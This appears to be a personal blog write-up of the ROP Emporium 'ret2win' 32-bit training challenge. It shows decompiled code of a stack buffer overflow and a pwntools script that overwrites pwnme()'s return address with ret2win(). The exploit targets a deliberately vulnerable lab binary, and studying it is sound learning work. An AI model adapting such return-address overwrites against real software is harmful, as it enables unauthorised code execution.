+++
date = '2026-05-30T00:57:39+03:00'
draft = false
title = 'Ret2win'
+++

# Challenge 0 - Ret2Win


In thie challenge we receive a binary that asks us for input and also
gives us a straightforward hint,

when lookg througha  decompiler we get 


```c

08048546    int32_t main()

0804854d        void* const __return_addr_1 = __return_addr
08048553        void arg_4
08048553        void* var_c = &arg_4
08048563        setvbuf(__TMC_END__, 0, 2, 0)
08048573        puts("ret2win by ROP Emporium")
08048583        puts("x86\n")
0804858b        pwnme()
08048598        puts("\nExiting")
080485ac        return 0


080485ad    int32_t pwnme()

080485be        void var_2c
080485be        memset(&var_2c, 0, 0x20)
080485ce        puts("For my first trick, I will attempt to fit 56 bytes of user input "
080485ce        "into 32 bytes of stack buffer!")
080485de        puts("What could possibly go wrong?")
080485ee        puts("You there, may I have your input please? And don't worry about null "
080485ee        "bytes, we're using read()!\n")
080485fe        printf(0x80487e8)
08048611        read(0, &var_2c, 0x38)
0804862b        return puts("Thank you!")


0804862c    int32_t ret2win()

0804863a        puts("Well done! Here's your flag:")
08048654        return system("/bin/cat flag.txt")



```

the idea here is to overflow the return address of pwnme() to ret2win()
when looking the the stack diagram we see that we need to pad 0x2c bytes and then
add the ret2win func address i used the following pwntools script:


```python
from pwn import *




p = process("./ret2win32")


context.binary = ELF("./ret2win32")
context.arch = "i386"
context.terminal = ["ghostty", "-e"]



win = 0x804862c



payload = b"A"*0x2c
payload += p32(win)
pause()

p.sendlineafter(b">",payload)
p.interactive()



```
